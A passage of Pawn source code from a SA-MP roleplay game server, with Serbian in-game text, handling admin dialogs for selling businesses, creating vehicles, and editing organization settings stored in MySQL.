		BusinessInfo[ id ][ bOwner_sqlID ] = -1;
		BusinessInfo[ id ][ bOnAuction ] = true;
    	strmid( BusinessInfo[ id ][ bOwner ], "Drzava", 0, strlen( "Drzava" ), 32);
    	BusinessInfo[ id ][ bNeaktivnost ] = 0;
    	BusinessInfo[ id ][ bFacture ] = 100;
    	Bussines_Refresh( id );
    	SendInfoMessage( playerid, "Prodali ste firmu ID {FFFFFF}(%d).", id );

    	new q[ 256 ];
		mysql_format( mSQL, q, sizeof(q), "UPDATE `bussines` SET `b_owner_sqlID` = '%d', `bOnAuction` = '1', `bOwner` = '%s', `b_neaktivnost` = '%d', `b_facture` = '%d' WHERE `bussines_id` = '%d'",
				BusinessInfo[ id ][ bOwner_sqlID ],
				BusinessInfo[ id ][ bOwner ],
				BusinessInfo[ id ][ bNeaktivnost ],
				BusinessInfo[ id ][ bFacture ], BusinessInfo[ id ][ b_ID ] );

	   	mysql_tquery( mSQL, q);
    }
	else if(dialogid == dialog_VCREATE )
	{
		if(!response)
		{
			ShowPlayerDialog( playerid, dialog_NAPRAVISVE, DIALOG_STYLE_LIST, D_NASLOV,
																						"{4282C0}(1). {FFFFFF}Organizacije\n\
																						{4282C0}(2). {FFFFFF}Vozila\n\
																						{4282C0}(3). {FFFFFF}Firmu\n\
																						{4282C0}(4). {FFFFFF}Kontejner\n\
																						{4282C0}(5). {FFFFFF}Kuca\n\
																						{4282C0}(6). {FFFFFF}Stan\n\
																						{4282C0}(7). {FFFFFF}Vikendica\n\
																						{4282C0}(8). {FFFFFF}Tiki\n\
																						{4282C0}(9). {FFFFFF}Bankomat\n\
																						{4282C0}(10). {FFFFFF}((empty))\n\
																						{4282C0}(11). {FFFFFF}Kapija\n\
																						{4282C0}(12). {FFFFFF}((empty))\n\
																						{4282C0}(13). {FFFFFF}((empty))\n\
																						{4282C0}(14). {FFFFFF}GPS Lokacija\n\
																						{4282C0}(15). {FFFFFF}Gang Zona\n\
																						{4282C0}(16). {FFFFFF}Poklon\n\
																						{4282C0}(17). {FFFFFF}Jelka\n\
																						{4282C0}(18). {FFFFFF}Rent", "Potvrdi", "Nazad" );
		}
	    if( response )
		{
	        if( ServerInfo[ BrojKreiranihVozila ] > MaxBrojKreiranih ) return SendClientMessage( playerid, ANTICHEAT, "[ANTICHEAT]: Nemoguce je trenutno kreirati vozilo, limit vozila na serveru je dosegnut.");
		    new idauta, Float:PozX, Float:PozY, Float:PozZ, Float:PozA, boja1, boja2;
		    GetPlayerPos( playerid, PozX, PozY, PozZ );
		    GetPlayerFacingAngle( playerid, PozA );
		    if(carspawntimer == 1)
			{
				SCMF( playerid, ANTICHEAT, "(ANTICHEAT): Neko je spawnao/parkirao vozilo pre vas. Pokusajte za 3 sekunde. (Anticrash)");
				return 1;
		    }
		    if( sscanf( inputtext, "iii", idauta, boja1, boja2 ) ) return ShowPlayerDialog( playerid, dialog_VCREATE, DIALOG_STYLE_INPUT, D_NASLOV, "{FFFFFF}* Unesite id zeljenog vozila, id boje1, id boje2:", "Potvrdi", "Nazad" );
			if( idauta < 400 || idauta > 611 ) return ShowPlayerDialog( playerid, dialog_VCREATE, DIALOG_STYLE_INPUT, D_NASLOV, "{FFFFFF}* Unesite id zeljenog vozila, id boje1, id boje2:", "Potvrdi", "Nazad" );
			if( VehPrice[ idauta-400 ][ 1 ] == 0 ) return SendErrorMessage( playerid, "Vozilo sa unetim IDem se ne moze kreirati zbog nedefinisane cene." );
            if( boja1 < 0 || boja1 > 255 ) return SendErrorMessage( playerid, "Prva boja ne moze biti manja od 0 ili veca od 255.");
    		if( boja2 < 0 || boja2 > 255 ) return SendErrorMessage( playerid, "Druga boja ne moze biti manja od 0 ili veca od 255.");

            sql_create_vehicle( idauta, PRIVATNO_VOZILO, -1, PozX, PozY, PozZ, PozA, boja1, boja2 );

		    SendInfoMessage( playerid, "Uspesno ste kreirali vozilo. ID Auta: {FFFFFF}(%d) {4282C0}| Cena: {FFFFFF}(%d).", idauta, VehPrice[ idauta- 400 ][ 1 ] );
		}
	}
	else if(dialogid == dialog_IVCREATE )
	{
		if(!response)
		{
			ShowPlayerDialog( playerid, dialog_NAPRAVISVE, DIALOG_STYLE_LIST, D_NASLOV,
																						"{4282C0}(1). {FFFFFF}Organizacije\n\
																						{4282C0}(2). {FFFFFF}Vozila\n\
																						{4282C0}(3). {FFFFFF}Firmu\n\
																						{4282C0}(4). {FFFFFF}Kontejner\n\
																						{4282C0}(5). {FFFFFF}Kuca\n\
																						{4282C0}(6). {FFFFFF}Stan\n\
																						{4282C0}(7). {FFFFFF}Vikendica\n\
																						{4282C0}(8). {FFFFFF}Tiki\n\
																						{4282C0}(9). {FFFFFF}Bankomat\n\
																						{4282C0}(10). {FFFFFF}((empty))\n\
																						{4282C0}(11). {FFFFFF}Kapija\n\
																						{4282C0}(12). {FFFFFF}((empty))\n\
																						{4282C0}(13). {FFFFFF}((empty))\n\
																						{4282C0}(14). {FFFFFF}GPS Lokacija\n\
																						{4282C0}(15). {FFFFFF}Gang Zona\n\
																						{4282C0}(16). {FFFFFF}Poklon\n\
																						{4282C0}(17). {FFFFFF}Jelka\n\
																						{4282C0}(18). {FFFFFF}Rent", "Potvrdi", "Nazad" );
		}
	    if( response )
		{
	        if( ServerInfo[ BrojKreiranihVozila ] > MaxBrojKreiranih ) return SendClientMessage( playerid, ANTICHEAT, "[ANTICHEAT]: Nemoguce je trenutno kreirati vozilo, limit vozila na serveru je dosegnut.");
		    new idauta, Float:PozX, Float:PozY, Float:PozZ, Float:PozA, boja1, boja2;
		    GetPlayerPos( playerid, PozX, PozY, PozZ );
		    GetPlayerFacingAngle( playerid, PozA );
		    if(carspawntimer == 1)
		    {
				SCMF( playerid, ANTICHEAT, "(ANTICHEAT): Neko je spawnao/parkirao vozilo pre vas. Pokusajte za 3 sekunde. (Anticrash)");
				return 1;
		    }
		    if( sscanf( inputtext, "iii", idauta, boja1, boja2 ) ) return ShowPlayerDialog( playerid, dialog_IVCREATE, DIALOG_STYLE_INPUT, D_NASLOV, "{FFFFFF}* Unesite id zeljenog auta za izlozbeno vozilo, id boje1, id boje2:", "Potvrdi", "Nazad" );
			if( idauta < 400 || idauta > 611 ) return ShowPlayerDialog( playerid, dialog_IVCREATE, DIALOG_STYLE_INPUT, D_NASLOV, "{FFFFFF}* Unesite id zeljenog auta za izlozbeno vozilo, id boje1, id boje2:", "Potvrdi", "Nazad" );
            if( boja1 < 0 || boja1 > 255 ) return SendErrorMessage( playerid, "Prva boja ne moze biti manja od 0 ili veca od 255.");
    		if( boja2 < 0 || boja2 > 255 ) return SendErrorMessage( playerid, "Druga boja ne moze biti manja od 0 ili veca od 255.");

            sql_create_vehicle( idauta, IZLOZBENO_VOZILO, -1, PozX, PozY, PozZ, PozA, boja1, boja2 );

			SendInfoMessage( playerid, "Uspesno ste kreirali izlozbeno vozilo ID {FFFFFF}(%d).", idauta );
		}
	}
	else if(dialogid == dialog_OVCREATE )
	{
		if(!response)
		{
			ShowPlayerDialog( playerid, dialog_NAPRAVISVE, DIALOG_STYLE_LIST, D_NASLOV,
																						"{4282C0}(1). {FFFFFF}Organizacije\n\
																						{4282C0}(2). {FFFFFF}Vozila\n\
																						{4282C0}(3). {FFFFFF}Firmu\n\
																						{4282C0}(4). {FFFFFF}Kontejner\n\
																						{4282C0}(5). {FFFFFF}Kuca\n\
																						{4282C0}(6). {FFFFFF}Stan\n\
																						{4282C0}(7). {FFFFFF}Vikendica\n\
																						{4282C0}(8). {FFFFFF}Tiki\n\
																						{4282C0}(9). {FFFFFF}Bankomat\n\
																						{4282C0}(10). {FFFFFF}((empty))\n\
																						{4282C0}(11). {FFFFFF}Kapija\n\
																						{4282C0}(12). {FFFFFF}((empty))\n\
																						{4282C0}(13). {FFFFFF}((empty))\n\
																						{4282C0}(14). {FFFFFF}GPS Lokacija\n\
																						{4282C0}(15). {FFFFFF}Gang Zona\n\
																						{4282C0}(16). {FFFFFF}Poklon\n\
																						{4282C0}(17). {FFFFFF}Jelka\n\
																						{4282C0}(18). {FFFFFF}Rent", "Potvrdi", "Nazad" );
		}
	    if( response )
		{
	        if( ServerInfo[ BrojKreiranihVozila ] > MaxBrojKreiranih ) return SendClientMessage( playerid, ANTICHEAT, "[ANTICHEAT]: Nemoguce je trenutno kreirati vozilo, limit vozila na serveru je dosegnut.");
		    new idauta, orga, Float:PozX, Float:PozY, Float:PozZ, Float:PozA, boja1, boja2;
		    GetPlayerPos( playerid, PozX, PozY, PozZ );
		    GetPlayerFacingAngle( playerid, PozA );
		    if(carspawntimer == 1)
		    {
				SCMF( playerid, ANTICHEAT, "(ANTICHEAT): Neko je spawnao/parkirao vozilo pre vas. Pokusajte za 3 sekunde. (Anticrash)");
				return 1;
		    }
		    if( sscanf( inputtext, "iiii", idauta, orga, boja1, boja2 ) ) return ShowPlayerDialog( playerid, dialog_OVCREATE, DIALOG_STYLE_INPUT, D_NASLOV, "{FFFFFF}* Unesite id zeljenog auta, id organizacije, id boje1, id boje2:", "Potvrdi", "Nazad" );
			if( idauta < 400 || idauta > 611 ) return ShowPlayerDialog( playerid, dialog_OVCREATE, DIALOG_STYLE_INPUT, D_NASLOV, "{FFFFFF}* Unesite id zeljenog auta, id organizacije, id boje1, id boje2:", "Potvrdi", "Nazad" );
	        if( orga < 1 ) return SendErrorMessage( playerid, "Pogresan id organizacije(1+)!" );
            if( boja1 < 0 || boja1 > 255 ) return SendErrorMessage( playerid, "Prva boja ne moze biti manja od 0 ili veca od 255.");
    		if( boja2 < 0 || boja2 > 255 ) return SendErrorMessage( playerid, "Druga boja ne moze biti manja od 0 ili veca od 255.");
			if( org_info[ orga ][ oID ] == 0 ) return SendErrorMessage( playerid, "Ta organizacija ne postoji u bazi podataka." );

			sql_create_vehicle( idauta, ORGANIZACIJSKO_VOZILO, orga, PozX, PozY, PozZ, PozA, boja1, boja2 );

			SendInfoMessage( playerid, "Uspesno ste kreirali organizacijsko vozilo. ID Auta: {FFFFFF}(%d) {4282C0}| Org ID: {FFFFFF}(%d).", idauta, orga );
		}
	}
	else if(dialogid == dialog_ORGEDIT )
	{
	    switch(listitem)
	    {
		    case 0: ShowPlayerDialog( playerid, dialog_ORGNAME, DIALOG_STYLE_INPUT, D_NASLOV, "{FFFFFF}* Unesite id i zeljeno ime vase organizacije:", "Potvrdi", "Odustani" );
		    case 1:
			{
		        if( GetNearestOrganization( playerid ) == -1 ) return SendErrorMessage( playerid, "Morate biti na pickupu organizacije." );
		        ShowPlayerDialog( playerid, dialog_ORGINT1, DIALOG_STYLE_LIST, D_NASLOV,
																							"{4282C0}(1). {FFFFFF}Default interior\n\
																							{4282C0}(2). {FFFFFF}Unesi sam kordinate\n\
																							{4282C0}(3). {FFFFFF}Interior bande\n\
																							{4282C0}(4). {FFFFFF}Interior mafije\n\
																							{4282C0}(5). {FFFFFF}Interior hitmana", "Potvrdi", "Odustani" );
			}
		    case 2:
			{
		        if( GetNearestOrganization( playerid ) == -1 ) return SendErrorMessage( playerid, "Morate biti na pickupu organizacije." );
		        ShowPlayerDialog( playerid, dialog_ORGRANKS, DIALOG_STYLE_LIST, D_NASLOV,
																							"{4282C0}(1). {FFFFFF}Rank 1\n\
																							{4282C0}(2). {FFFFFF}Rank 2\n\
																							{4282C0}(3). {FFFFFF}Rank 3\n\
																							{4282C0}(4). {FFFFFF}Rank 4\n\
																							{4282C0}(5). {FFFFFF}Rank 5\n\
																							{4282C0}(6). {FFFFFF}Rank 6", "Potvrdi", "Odustani" );
			}
		    case 3:
			{
		        if( GetNearestOrganization( playerid ) == -1 ) return SendErrorMessage( playerid, "Morate biti na pickupu organizacije." );
		        ShowPlayerDialog( playerid, dialog_ORGTIP, DIALOG_STYLE_LIST, D_NASLOV,
																							"{4282C0}(1). {FFFFFF}Tip: PD/SD\n\
																							{4282C0}(2). {FFFFFF}Tip: Banda\n\
																							{4282C0}(3). {FFFFFF}Tip: Mafija\n\
																							{4282C0}(4). {FFFFFF}Tip: Bajkeri\n\
																							{4282C0}(5). {FFFFFF}Tip: Hitmani", "Potvrdi", "Odustani" );
			}
			case 4:
			{
	            if( GetNearestOrganization( playerid ) == -1 ) return SendErrorMessage( playerid, "Morate biti na pickupu organizacije." );
	            ShowPlayerDialog( playerid, dialog_ORGSKINS, DIALOG_STYLE_INPUT, D_NASLOV, "{FFFFFF}* Unesite id-ove muskih skinova za rankove koje zelite:\nMora biti 6 ID-ova.\nPrimer: 1 2 3 4 5 6", "Potvrdi", "Odustani" );
			}
	        case 5:
			{
	            if( GetNearestOrganization( playerid ) == -1 ) return SendErrorMessage( playerid, "Morate biti na pickupu organizacije." );
	            ShowPlayerDialog( playerid, dialog_ORGPREFIX, DIALOG_STYLE_INPUT, D_NASLOV, "{FFFFFF}* Unesite skracenicu organizacije. Primer: LSPD", "Potvrdi", "Odustani" );
			}
	        case 6:
			{
	            ShowPlayerDialog( playerid, dialog_ORGDUTYP, DIALOG_STYLE_INPUT, D_NASLOV, "{FFFFFF}* Unesti ID organizacije za koju pravite duty point:", "Potvrdi", "Odustani" );
			}
	        case 7:
			{
				ShowPlayerDialog( playerid, dialog_ORGEQUIPP, DIALOG_STYLE_INPUT, D_NASLOV, "{FFFFFF}* Unesti ID organizacije za koju pravite equipment point:", "Potvrdi", "Odustani" );
			}
			case 8:
			{
	            if( GetNearestOrganization( playerid ) == -1 ) return SendErrorMessage( playerid, "Morate biti na pickupu organizacije." );
	            ShowPlayerDialog( playerid, dialog_ORGZSKINS, DIALOG_STYLE_INPUT, D_NASLOV, "{FFFFFF}* Unesite id-ove zenskih skinova za rankove koje zelite:\nMora biti 6 ID-ova.\nPrimer: 1 2 3 4 5 6", "Potvrdi", "Odustani" );
			}
			case 9:
			{
			    if( GetNearestOrganization( playerid ) == -1 ) return SendErrorMessage( playerid, "Morate biti na pickupu organizacije." );
				ShowPlayerDialog( playerid, dialog_ORGMAXMEMB, DIALOG_STYLE_INPUT, D_NASLOV, "{FFFFFF}* Unesti broj koliko ova orga moze imati maksimalno clanova (8 > 50):", "Potvrdi", "Odustani" );
	        }
	        case 10:
			{
	            if( inOrgInt[ playerid ] == -1 ) return SendErrorMessage( playerid, "Morate biti u interijeru organizacije." );
				new id = inOrgInt[ playerid ], Float:Pos[ 3 ];

				GetPlayerPos( playerid, Pos[ 0 ], Pos[ 1 ], Pos[ 2 ] );
			    org_info[ id ][ oSafePos ][ 0 ] = Pos[ 0 ];
			    org_info[ id ][ oSafePos ][ 1 ] = Pos[ 1 ];
			    org_info[ id ][ oSafePos ][ 2 ] = Pos[ 2 ];

			    if( IsValidDynamic3DTextLabel( org_info[id][oSafe3D] ) ) DestroyDynamic3DTextLabel( org_info[id][oSafe3D] );
				if( IsValidDynamicPickup( org_info[id][oSafePickup] ) ) DestroyDynamicPickup( org_info[id][oSafePickup] );

			    org_info[id][oSafe3D] = CreateDynamic3DTextLabel("Sef\nDa koristite sef organizacije kucajte {FFFFFF}\"/orgsef\"", 0xFF6200FF, org_info[ id ][ oSafePos ][ 0 ], org_info[ id ][ oSafePos ][ 1 ], org_info[ id ][ oSafePos ][ 2 ], 5, IPI, IVI, 0, org_info[ id ][ oVw ], org_info[ id ][ oInt ], -1, 20.0);
				org_info[id][oSafePickup] = CreateDynamicPickup( 1239, 1, org_info[ id ][ oSafePos ][ 0 ], org_info[ id ][ oSafePos ][ 1 ], org_info[ id ][ oSafePos ][ 2 ], org_info[ id ][ oVw ], org_info[ id ][ oInt ], -1, 20.0 );

	            new q[ 144 ];
				mysql_format( mSQL, q, sizeof(q), "UPDATE `organizations` SET `safe_pos_x` = '%f', `safe_pos_y` = '%f', `safe_pos_z` = '%f' WHERE `org_id` = '%d' LIMIT 1",
					org_info[ id ][ oSafePos ][ 0 ],
					org_info[ id ][ oSafePos ][ 1 ],
					org_info[ id ][ oSafePos ][ 2 ],
					org_info[ id ][ oID ] );
				mysql_tquery( mSQL, q );

				SendInfoMessage( playerid, "Napravili ste sef za orgu {FFFFFF}%s.", org_info[ id ][ oName ] );
	        }
	        case 11:
			{
	            if( GetNearestOrganization( playerid ) == -1 ) return SendErrorMessage( playerid, "Morate biti na pickupu organizacije." );
	            ShowPlayerDialog( playerid, dialog_ORGCOLOR, DIALOG_STYLE_INPUT, D_NASLOV, "{FFFFFF}* Unesite boju za organizaciju(vezano za zone).\nPrimer: FF00FF", "Potvrdi", "Odustani" );
			}
			case 12:
			{
	            if( GetNearestOrganization( playerid ) == -1 ) return SendErrorMessage( playerid, "Morate biti na pickupu organizacije." );

	            new id = GetNearestOrganization( playerid );

	            if( !org_info[ id ][ oSuspended ] )
				{
					org_info[ id ][ oSuspended ] = 1;
					SendInfoMessage( playerid, "Zakljucao si organizaciju {FFFFFF}%s. ", org_info[ id ][ oName ] );
				}
	            else if( org_info[ id ][ oSuspended ] )
				{
					org_info[ id ][ oSuspended ] = 0;
					SendInfoMessage( playerid, "Otkljucao si organizaciju {FFFFFF}%s. ", org_info[ id ][ oName ] );
				}

	            new q[ 144 ];
				mysql_format( mSQL, q, sizeof(q), "UPDATE `organizations` SET `suspended` = '%d' WHERE `org_id` = '%d' LIMIT 1",
						org_info[ id ][ oSuspended ],
						org_info[ id ][ oID ] );
				mysql_tquery( mSQL, q);
			}
			case 13:
			{
			    if( inOrgInt[ playerid ] == -1 ) return SendErrorMessage( playerid, "Morate biti u interijeru organizacije." );
			    ShowPlayerDialog( playerid, dialog_ORGSPAWNP, DIALOG_STYLE_INPUT, D_NASLOV, "{FFFFFF}* Unesite ID zeljenje organizacije koja ce se spawnati na mestu gde stojite:", "Potvrdi", "Odustani" );
			}
			case 14:
			{
			    if( GetNearestOrganization( playerid ) == -1 ) return SendErrorMessage( playerid, "Morate biti na pickupu organizacije." );
			    ShowPlayerDialog( playerid, dialog_ORGBENTRANCE, DIALOG_STYLE_INPUT, D_NASLOV, "{FFFFFF}* Ako je ulaz u organizaciju iz neke firme unesi ID firme.\nUkoliko nije unesi -1", "Potvrdi", "Odustani" );
			}
	  		case 15:
	  		{
	            ShowPlayerDialog( playerid, dialog_ORGDILER, DIALOG_STYLE_INPUT, D_NASLOV, "{FFFFFF}* Unesti ID organizacije za koju pravite dilera:", "Potvrdi", "Odustani" );
			}
	  		case 16:
	  		{
	            ShowPlayerDialog( playerid, dialog_ORGPORT, DIALOG_STYLE_INPUT, D_NASLOV, "{FFFFFF}* Unesti ID organizacije za koju pravite port:", "Potvrdi", "Odustani" );
			}
		}
	}
	else if(dialogid == dialog_ORGRANKS )
	{
	    switch(listitem)
	    {
		    case 0: ShowPlayerDialog( playerid, dialog_ORGRANK1, DIALOG_STYLE_INPUT, D_NASLOV, "{FFFFFF}* U prazni prostor ispod unesite ime za rank 1 ove organizacije.", "Potvrdi", "Odustani" );
		    case 1: ShowPlayerDialog( playerid, dialog_ORGRANK2, DIALOG_STYLE_INPUT, D_NASLOV, "{FFFFFF}* U prazni prostor ispod unesite ime za rank 2 ove organizacije.", "Potvrdi", "Odustani" );
		    case 2: ShowPlayerDialog( playerid, dialog_ORGRANK3, DIALOG_STYLE_INPUT, D_NASLOV, "{FFFFFF}* U prazni prostor ispod unesite ime za rank 3 ove organizacije.", "Potvrdi", "Odustani" );
		    case 3: ShowPlayerDialog( playerid, dialog_ORGRANK4, DIALOG_STYLE_INPUT, D_NASLOV, "{FFFFFF}* U prazni prostor ispod unesite ime za rank 4 ove organizacije.", "Potvrdi", "Odustani" );
		    case 4: ShowPlayerDialog( playerid, dialog_ORGRANK5, DIALOG_STYLE_INPUT, D_NASLOV, "{FFFFFF}* U prazni prostor ispod unesite ime za rank 5(podlider) ove organizacije.", "Potvrdi", "Odustani" );
		    case 5: ShowPlayerDialog( playerid, dialog_ORGRANK6, DIALOG_STYLE_INPUT, D_NASLOV, "{FFFFFF}* U prazni prostor ispod unesite ime za rank 6(lider) ove organizacije.", "Potvrdi", "Odustani" );
		}
	}
	else if(dialogid == dialog_ORGNAME && response )
	{
        new id, ime[ ORG_IME ];
		if(sscanf( inputtext, "is[40]", id, ime ) ) return ShowPlayerDialog( playerid, dialog_ORGNAME, DIALOG_STYLE_INPUT, D_NASLOV, "{FFFFFF}* Unesite id i zeljeno ime vase organizacije:", "Potvrdi", "Odustani");
		if( id < 1 || org_info[ id ][ oID ] == 0 ) return SendErrorMessage( playerid, "Ta organizacija ne postoji u bazi podataka." );
		if( OrgKreiranje[ playerid ] == 0 )
		{
			strmid( org_info[ id ][ oName ], ime, 0, strlen( ime ), ORG_IME);
			Orge3D( id );

			new q[144];
			mysql_format( mSQL, q, sizeof(q), "UPDATE `organizations` SET `name` = '%e' WHERE `org_id` = '%d' LIMIT 1",
					org_info[ id ][ oName ],
					org_info[ id ][ oID ] );
			mysql_tquery( mSQL, q );

			SendInfoMessage( playerid, "Promenili ste ime organizacije ID {FFFFFF}(%d) {4282C0}u {FFFFFF}%s.", id, ime );

			if( org_info[ id ][ oBussinesID ] != -1 ) Bussines_Refresh( org_info[ id ][ oBussinesID ] );
		}
	}
	else if(dialogid == dialog_ORGSPAWNP && response )
	{
        new id;
		if(sscanf( inputtext, "i", id ) ) return ShowPlayerDialog( playerid, dialog_ORGSPAWNP, DIALOG_STYLE_INPUT, D_NASLOV, "{FFFFFF}* Unesite id zeljenje organizacije koja ce se spawnati na mestu gde stojite:", "Potvrdi", "Odustani" );
		if( id < 1 || org_info[ id ][ oID ] == 0 ) return SendErrorMessage( playerid, "Ta organizacija ne postoji u bazi podataka." );
		if( inOrgInt[ playerid ] != id ) return SendErrorMessage( playerid, "Morate biti u interijeru izabrane organizacije." );

		GetPlayerPos( playerid, org_info[ id ][ oSpawnPoint ][ 0 ], org_info[ id ][ oSpawnPoint ][ 1 ], org_info[ id ][ oSpawnPoint ][ 2 ] );

		new q[ 256 ];
		mysql_format( mSQL, q, sizeof(q), "UPDATE `organizations` SET `spawn_point_x` = '%f', `spawn_point_y` = '%f', `spawn_point_z` = '%f' WHERE `org_id` = '%d' LIMIT 1",
											org_info[ id ][ oSpawnPoint ][ 0 ],
											org_info[ id ][ oSpawnPoint ][ 1 ],
											org_info[ id ][ oSpawnPoint ][ 2 ],
											org_info[ id ][ oID ] );
		mysql_tquery( mSQL, q);

		SendInfoMessage( playerid, "Promenili ste spawn point organizacije ID {FFFFFF}(%d).", id );
	}
	else if(dialogid == dialog_ORGPORT && response )
	{
        new id;
		if(sscanf( inputtext, "i", id ) ) return ShowPlayerDialog( playerid, dialog_ORGSPAWNP, DIALOG_STYLE_INPUT, D_NASLOV, "{FFFFFF}* Unesite id zeljenje organizacije za port na mesto gde stojite:", "Potvrdi", "Odustani" );
		if( id < 1 || org_info[ id ][ oID ] == 0 ) return SendErrorMessage( playerid, "Ta organizacija ne postoji u bazi podataka." );

		GetPlayerPos( playerid, org_info[ id ][ oPortX ], org_info[ id ][ oPortY ], org_info[ id ][ oPortZ ] );
		GetPlayerFacingAngle(playerid, org_info[ id ][ oPortA ]);

		new q[ 256 ];
		mysql_format( mSQL, q, sizeof(q), "UPDATE `organizations` SET `oPortX` = '%f', `oPortY` = '%f', `oPortZ` = '%f', `oPortA` = '%f' WHERE `org_id` = '%d' LIMIT 1",
											org_info[ id ][ oPortX ],
											org_info[ id ][ oPortY ],
											org_info[ id ][ oPortZ ],
											org_info[ id ][ oPortA ],
											org_info[ id ][ oID ] );
		mysql_tquery( mSQL, q);

		SendInfoMessage( playerid, "Promenili ste port organizacije ID {FFFFFF}(%d).", id );
	}
	else if(dialogid == dialog_ORGDUTYP && response )
	{
        new id, Float:Pos[ 3 ];
		if( sscanf( inputtext, "i", id ) ) return ShowPlayerDialog( playerid, dialog_ORGDUTYP, DIALOG_STYLE_INPUT, D_NASLOV, "{FFFFFF}* Unesti ID organizacije za koju pravite duty point.", "Potvrdi", "Odustani" );
        if( id < 1 || org_info[ id ][ oID ] == 0 ) return SendErrorMessage( playerid, "Ta organizacija ne postoji u bazi podataka." );
		if( org_info[ id ][ oTip ] != ORG_TIP_VLADINA ) return SendErrorMessage( playerid, "Samo organizacije tipa PD/SD." );
		GetPlayerPos( playerid, Pos[ 0 ], Pos[ 1 ], Pos[ 2 ] );
		org_info[ id ][ oDutyPoint ][ 0 ] = Pos[ 0 ];
		org_info[ id ][ oDutyPoint ][ 1 ] = Pos[ 1 ];
		org_info[ id ][ oDutyPoint ][ 2 ] = Pos[ 2 ];
		org_info[ id ][ oDutyInt ] = GetPlayerInterior( playerid );
        org_info[ id ][ oDutyVW ] = GetPlayerVirtualWorld( playerid );

		if( IsValidDynamic3DTextLabel( org_info[id][oDuty3D] ) ) DestroyDynamic3DTextLabel( org_info[id][oDuty3D] );
		if( IsValidDynamicPickup( org_info[id][oDutyPickup] ) ) DestroyDynamicPickup( org_info[id][oDutyPickup] );

		org_info[id][oDuty3D] = CreateDynamic3DTextLabel("Undercover\nDa idete undercover kucajte {FFFFFF}\"/undercover\"\n\n{FF6200}Duty\nDa idete na duznost kucajte {FFFFFF}\"/duty\"", 0xFF6200FF, org_info[ id ][ oDutyPoint ][ 0 ], org_info[ id ][ oDutyPoint ][ 1 ], org_info[ id ][ oDutyPoint ][ 2 ], 5, IPI, IVI, 0, org_info[ id ][ oDutyVW ], org_info[ id ][ oDutyInt ], -1, 20.0);
		org_info[id][oDutyPickup] = CreateDynamicPickup( 1239, 1, org_info[ id ][ oDutyPoint ][ 0 ], org_info[ id ][ oDutyPoint ][ 1 ], org_info[ id ][ oDutyPoint ][ 2 ], org_info[ id ][ oDutyVW ], org_info[ id ][ oDutyInt ], -1, 20.0 );

		new q[ 256 ];
		mysql_format( mSQL, q, sizeof(q), "UPDATE `organizations` SET `duty_point_pos_x` = '%f', `duty_point_pos_y` = '%f', `duty_point_pos_z` = '%f', `duty_point_int` = '%d', `duty_point_vw` = '%d' WHERE `org_id` = '%d' LIMIT 1",
			org_info[ id ][ oDutyPoint ][ 0 ],
			org_info[ id ][ oDutyPoint ][ 1 ],
			org_info[ id ][ oDutyPoint ][ 2 ],
			org_info[ id ][ oDutyInt ],
			org_info[ id ][ oDutyVW ],
			org_info[ id ][ oID ] );
		mysql_tquery( mSQL, q );

		SendInfoMessage( playerid, "Kreirali ste duty point za organizaciju ID {FFFFFF}(%d).", id );
	}
	else if(dialogid == dialog_ORGDILER && response )
	{
        new id, Float:Pos[ 4 ];
		if( sscanf( inputtext, "i", id ) ) return ShowPlayerDialog( playerid, dialog_ORGDUTYP, DIALOG_STYLE_INPUT, D_NASLOV, "{FFFFFF}* Unesti ID organizacije za koju pravite dilera.", "Potvrdi", "Odustani" );
        if( id < 1 || org_info[ id ][ oID ] == 0 ) return SendErrorMessage( playerid, "Ta organizacija ne postoji u bazi podataka." );
		if( org_info[ id ][ oTip ] != ORG_TIP_BANDA ) return SendErrorMessage( playerid, "Samo bande." );

		GetPlayerPos( playerid, Pos[ 0 ], Pos[ 1 ], Pos[ 2 ] );
		GetPlayerFacingAngle( playerid, Pos[ 3 ] );
		org_info[ id ][ oDiler ][ 0 ] = Pos[ 0 ];
		org_info[ id ][ oDiler ][ 1 ] = Pos[ 1 ];
		org_info[ id ][ oDiler ][ 2 ] = Pos[ 2 ];
		org_info[ id ][ oDiler ][ 3 ] = Pos[ 3 ];
		org_info[ id ][ oDilerRadi ] = false;

		SMG_SetPlayerPos(playerid, Pos[ 0 ], Pos[ 1 ]+2, Pos[ 2 ]);

	    if( IsValidDynamicActor( org_info[id][oDilerActor] ) ) DestroyDynamicActor( org_info[id][oDilerActor] );
	    if( IsValidDynamic3DTextLabel( org_info[id][oDiler3D] ) ) DestroyDynamic3DTextLabel( org_info[id][oDiler3D] );

        org_info[id][oDilerActor] = CreateDynamicActor( org_info[ id ][ oSkin1 ], org_info[ id ][ oDiler ][ 0 ], org_info[ id ][ oDiler ][ 1 ], org_info[ id ][ oDiler ][ 2 ], org_info[ id ][ oDiler ][ 3 ], 1, 100.0, -1, -1, -1, 200.0, -1, 0);

		new q[200];
		format(q, sizeof(q), "(DILER - [%d])\nCena: {FFFFFF}$%d\n{64BC47}Dostupno: {FFFFFF}%dg\n{64BC47}Dostupan: {FFFFFF}%s", id, org_info[ id ][ oDilerCena ], org_info[ id ][ oSafeDrugAmmount ], ((org_info[id][oDilerRadi]) ? ("Da") : ("Ne")) );
		org_info[id][oDiler3D] = CreateDynamic3DTextLabel( q, 0x64BC47FF, org_info[ id ][ oDiler ][ 0 ], org_info[ id ][ oDiler ][ 1 ], org_info[ id ][ oDiler ][ 2 ], 5, IPI, IVI, 0, -1, -1, -1, 20.0);

		mysql_format( mSQL, q, sizeof(q), "UPDATE `organizations` SET `oDilerX` = '%f', `oDilerY` = '%f', `oDilerZ` = '%f', `oDilerA` = '%f', `oDilerRadi` = '0' WHERE `org_id` = '%d' LIMIT 1",
			org_info[ id ][ oDiler ][ 0 ],
			org_info[ id ][ oDiler ][ 1 ],
			org_info[ id ][ oDiler ][ 2 ],
			org_info[ id ][ oDiler ][ 3 ],
			org_info[ id ][ oID ] );
		mysql_tquery( mSQL, q );

		SendInfoMessage( playerid, "Kreirali ste dilera za organizaciju ID {FFFFFF}(%d).", id );
	}
	else if(dialogid == dialog_ORGEQUIPP && response )
	{
        new id, Float:Pos[ 3 ];
		if(sscanf( inputtext, "i", id ) ) return ShowPlayerDialog( playerid, dialog_ORGEQUIPP, DIALOG_STYLE_INPUT, D_NASLOV, "{FFFFFF}* Unesti ID organizacije za koju pravite equipment point.", "Potvrdi", "Odustani" );
        if( id < 1 || org_info[ id ][ oID ] == 0 ) return SendErrorMessage( playerid, "Ta organizacija ne postoji u bazi podataka." );
		if( org_info[ id ][ oTip ] != ORG_TIP_VLADINA ) return SendErrorMessage( playerid, "Samo vladine organizacije." );
